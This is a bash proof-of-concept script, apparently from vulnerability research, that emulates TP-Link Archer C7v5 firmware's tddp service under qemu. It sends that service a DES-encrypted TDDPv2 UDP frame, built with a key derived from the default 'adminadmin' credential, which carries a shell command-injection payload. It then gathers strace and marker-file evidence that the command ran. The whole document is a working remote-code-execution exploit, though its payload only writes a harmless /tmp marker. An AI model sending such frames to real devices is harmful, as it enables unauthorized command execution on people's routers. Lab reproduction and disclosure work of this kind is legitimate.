#!/usr/bin/env bash
set -euo pipefail

SRC="/root/inout/firmware/unpacked/tp-link/c7v5_us-up-ver1-2-1-P1[20220715-rel19099]_2022-07-15_17.44.43/_c7v5_us-up-ver1-2-1-P1[20220715-rel19099]_2022-07-15_17.44.43.bin.extracted/squashfs-root"
BASE="/root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08"
ROOT="$BASE/rootfs"

rm -rf "$ROOT"
mkdir -p "$BASE"
cp -a "$SRC" "$ROOT"
rm -f "$ROOT/var"
mkdir -p "$ROOT/tmp" "$ROOT/proc" "$ROOT/dev" "$ROOT/var/run" "$ROOT/usr/bin"
cp /usr/bin/qemu-mips-static "$ROOT/usr/bin/qemu-mips-static"

gcc -static -O2 -o "$BASE/sh_bridge" "$BASE/sh_bridge.c"
sha256sum "$SRC/usr/bin/tddp" > "$BASE/tddp.source.sha256"
sha256sum "$ROOT/usr/bin/tddp" > "$BASE/tddp.rootfs.sha256"
sha256sum "$BASE/sh_bridge" > "$BASE/sh_bridge.sha256"

if [ -L "$ROOT/bin/sh" ]; then
  rm "$ROOT/bin/sh"
else
  mv "$ROOT/bin/sh" "$ROOT/bin/sh.orig"
fi
cp "$BASE/sh_bridge" "$ROOT/bin/sh"
chmod +x "$ROOT/bin/sh"

rm -f "$ROOT/tmp/pwned" "$ROOT/tmp/cc-tmp" "$ROOT/tmp/bridge_shell_test"
rm -f "$ROOT/tmp/sh_bridge_argv.log"

env -i PATH="/bin:/sbin:/usr/bin:/usr/sbin" chroot "$ROOT" \
  /bin/sh -c 'echo BRIDGE_SHELL_OK >/tmp/bridge_shell_test'

env -i PATH="/bin:/sbin:/usr/bin:/usr/sbin" chroot "$ROOT" \
  /usr/bin/qemu-mips-static -strace -L / /usr/bin/tddp \
  >"$BASE/tddp.strace.log" 2>&1 &
pid=$!
sleep 2

python3 - >"$BASE/probe.log" 2>&1 <<'PY'
import hashlib
import socket
import subprocess
import time

KEY = hashlib.md5(b"adminadmin").digest()[:8]
payload = b"A'$(echo TDDP_RCE>/tmp/pwned)'"

def pad8(data: bytes) -> bytes:
    return data + b"\x00" * ((8 - len(data) % 8) % 8)

def enc(data: bytes) -> bytes:
    return subprocess.run(
        ["openssl", "enc", "-des-ecb", "-K", KEY.hex(), "-nopad", "-nosalt"],
        input=data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    ).stdout

def md5_frame(frame: bytes) -> bytes:
    b = bytearray(frame)
    b[0x0c:0x1c] = b"\x00" * 16
    return hashlib.md5(b).digest()

padded = pad8(payload)
h = bytearray(0x1c)
h[0] = 2
h[1] = 3
h[2] = 1
h[3] = 0
h[4:8] = len(padded).to_bytes(4, "big")
h[8:12] = bytes([0x54, 0x50, 0x52, 0x00])
h[0x0c:0x1c] = md5_frame(bytes(h) + padded)
frame = bytes(h) + enc(padded)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2.0)
time.sleep(0.2)
try:
    sock.sendto(frame, ("127.0.0.1", 1040))
    data, _ = sock.recvfrom(4096)
    print(f"sent={len(frame)} status=0x{data[3]:02x} resp={data.hex()}")
finally:
    sock.close()
PY

sleep 2
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true

{
  echo "### command"
  echo "bash $BASE/verify_tddpv2_hostexec_bridge.sh"
  echo
  echo "### hashes"
  cat "$BASE/tddp.source.sha256"
  cat "$BASE/tddp.rootfs.sha256"
  cat "$BASE/sh_bridge.sha256"
  echo
  echo "### bridge shell self-test"
  if [ -f "$ROOT/tmp/bridge_shell_test" ]; then
    echo "BRIDGE_SELF_TEST_OK"
    cat "$ROOT/tmp/bridge_shell_test"
  else
    echo "BRIDGE_SELF_TEST_FAILED"
  fi
  echo
  echo "### probe"
  cat "$BASE/probe.log"
  echo
  echo "### pwned"
  if [ -f "$ROOT/tmp/pwned" ]; then
    echo "PWNED_CREATED"
    ls -l "$ROOT/tmp/pwned"
    cat "$ROOT/tmp/pwned" 2>/dev/null || true
  else
    echo "no pwned marker"
  fi
  echo
  echo "### sh bridge argv log"
  if [ -f "$ROOT/tmp/sh_bridge_argv.log" ]; then
    cat "$ROOT/tmp/sh_bridge_argv.log"
  else
    echo "no bridge argv log"
  fi
  echo
  echo "### cc-tmp"
  cat "$ROOT/tmp/cc-tmp" 2>/dev/null || echo "no cc-tmp"
  echo
  echo "### exec evidence"
  grep -E 'clone|fork|wait|execve|ENOENT|/bin/sh|qemu-mips-static|busybox|tddp_execCmd|cmd:' "$BASE/tddp.strace.log" || true
  echo
  echo "### tddp command lines"
  grep -E 'spCmd|Product Name|cmd:' "$BASE/tddp.strace.log" || true
} | tee "$BASE/evidence.txt"

echo "$BASE/evidence.txt"
